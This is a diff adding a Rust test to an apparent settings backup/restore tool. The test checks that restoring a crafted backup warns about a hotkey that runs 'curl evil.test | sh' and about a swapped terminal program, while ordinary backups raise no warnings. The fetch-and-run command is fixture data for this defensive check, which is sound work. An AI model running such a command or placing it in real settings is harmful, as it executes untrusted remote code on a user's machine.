@@ -1129,6 +1129,65 @@ fn only_selected_categories_are_touched() {
 }
 
 #[test]
+fn settings_that_would_run_commands_on_their_own_are_called_out() {
+    let hostile = b"[[hotkey]]\nkey = \"Ctrl+Alt+F\"\nrun = \"shell:curl evil.test | sh\"\n\n[[hotkey]]\nkey = \"Ctrl+Alt+G\"\nquery = \"g \"\n\n[shell]\nterminal = \"evil-terminal\"\n";
+    let backup = read(&crafted(&[("settings.toml", "settings", hostile)])).unwrap();
+    let target = Env::new();
+    let shown = preview(
+        &target.roots,
+        &backup,
+        &[Category::Settings],
+        Mode::Merge,
+        &accept,
+    )
+    .unwrap();
+    let joined = shown.warnings.join("\n");
+    assert!(
+        joined.contains("Ctrl+Alt+F") && joined.contains("shell:curl evil.test"),
+        "{joined}"
+    );
+    assert!(joined.contains("evil-terminal"), "{joined}");
+    assert!(
+        !joined.contains("Ctrl+Alt+G"),
+        "a plain query hotkey is harmless: {joined}"
+    );
+
+    // Only when the settings are being restored, and not for what is already there.
+    let other = preview(&target.roots, &backup, &[], Mode::Merge, &accept).unwrap();
+    assert!(other.warnings.is_empty());
+    restore(
+        &target.roots,
+        &backup,
+        &[Category::Settings],
+        Mode::Merge,
+        &options(1),
+    )
+    .unwrap();
+    let again = preview(
+        &target.roots,
+        &backup,
+        &[Category::Settings],
+        Mode::Merge,
+        &accept,
+    )
+    .unwrap();
+    assert!(again.warnings.is_empty(), "{:?}", again.warnings);
+
+    // An ordinary backup has none.
+    let source = kitchen_sink();
+    let ordinary = read(&backup_bytes(&source, &all_categories())).unwrap();
+    let calm = preview(
+        &Env::new().roots,
+        &ordinary,
+        &all_categories(),
+        Mode::Merge,
+        &accept,
+    )
+    .unwrap();
+    assert!(calm.warnings.is_empty(), "{:?}", calm.warnings);
+}
+
+#[test]
 fn an_empty_category_in_a_backup_clears_it_on_replace_only() {
     let empty = Env::new();
     let backup = read(&backup_bytes(
